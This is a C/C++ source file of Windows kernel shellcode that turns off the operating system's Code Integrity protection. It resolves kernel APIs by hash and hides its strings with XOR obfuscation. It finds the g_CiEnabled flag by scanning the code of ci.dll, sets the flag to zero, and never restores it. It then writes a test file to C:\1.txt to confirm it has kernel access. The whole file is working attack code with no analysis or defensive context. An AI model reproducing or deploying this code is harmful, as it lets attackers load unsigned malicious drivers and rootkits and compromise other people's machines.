#include "shell_common.h"



QWORD GetAddr_g_CiEnabled(QWORD qwAddrModuleCi)
{
	DWORD i = 0, j = 0;
	auto qwA = PEGetProcAddressH(qwAddrModuleCi, H_CiInitialize);
	if (!qwA) {
		return 0;
	}
	do {
		if (*(PBYTE)(qwA + i) == 0xE9) {
			qwA = qwA + i + 5 + *(PLONG)(qwA + i + 1);
			do {
				// Scan for MOV to g_CiEnabled
				if (*(PUSHORT)(qwA + j) == 0x0D89) {
					return qwA + j + 6 + *(PLONG)(qwA + j + 2);
				}
				j++;
			} while (j < 256);
			return 0;
		}
		i++;
	} while (i < 128);
	return 0;
}
void test_file(PKERNEL_FUNCTIONS fnk)
{
	CHAR a_file[MAX_PATH];
	IO_STATUS_BLOCK _io;
	OBJECT_ATTRIBUTES _oa;
	UNICODE_STRING _su;
	ANSI_STRING _sa;
	HANDLE hFile;
	a_file[0] = '\\';
	a_file[1] = '?';
	a_file[2] = '?';
	a_file[3] = '\\';
	a_file[4] = 'c';
	a_file[5] = ':';
	a_file[6] = '\\';
	a_file[7] = 'p';
	a_file[8] = '.';
	a_file[9] = '1';
	a_file[10] = 0;
	fnk->RtlInitAnsiString(&_sa, XOR_STRING_A("\\??\\C:\\1.txt"));
	fnk->RtlAnsiStringToUnicodeString(&_su, &_sa, TRUE);
	fnk->RtlZeroMemory(&_oa, sizeof(OBJECT_ATTRIBUTES));
	fnk->RtlZeroMemory(&_io, sizeof(IO_STATUS_BLOCK));

	InitializeObjectAttributes(
		&_oa,
		&_su,
		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
		NULL,
		NULL);

	auto ns = fnk->ZwCreateFile(&hFile,
		GENERIC_WRITE | SYNCHRONIZE,
		&_oa,
		&_io,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		0,
		FILE_OVERWRITE_IF,
		FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
		NULL,
		0);
	if (NT_SUCCESS(ns))
	{
		LARGE_INTEGER offset;
		offset.QuadPart = 0;
		fnk->ZwWriteFile(hFile, nullptr, nullptr, nullptr, &_io, a_file, (ULONG)fnk->_strlen(a_file)+1, &offset, nullptr);

	}
	fnk->ZwClose(hFile);
}
EXTERN_C VOID driver_shellcode_entry(_In_ QWORD NtOsImageBase,_In_ PVOID _Context)
{
	CHAR C_CI[] = { 'c', 'i', '.', 'd', 'l', 'l', 0 };
	QWORD qwModuleCI_g_PG_Orig = 0;
	UNREFERENCED_PARAMETER(_Context);
	decltype(&ExAllocatePool) _ExAllocatePool = (decltype(&ExAllocatePool))PEGetProcAddressH(NtOsImageBase, H_ExAllocatePool);
	auto osFn = (PKERNEL_FUNCTIONS)_ExAllocatePool(NonPagedPool, sizeof(KERNEL_FUNCTIONS));
	InitializeKernelFunctions(NtOsImageBase, osFn);
	auto qwAddrModuleCI = KernelGetModuleBase(osFn, C_CI);
	if (!qwAddrModuleCI)
	{
		return;
	}
	auto pqwModuleCI_g_PG = (PQWORD)GetAddr_g_CiEnabled(qwAddrModuleCI);
	if (!pqwModuleCI_g_PG)
	{
		return;
	}
	qwModuleCI_g_PG_Orig = *pqwModuleCI_g_PG;
	*pqwModuleCI_g_PG = 0;
	test_file(osFn);
	auto _free = osFn->ExFreePool;
	_free(osFn);
}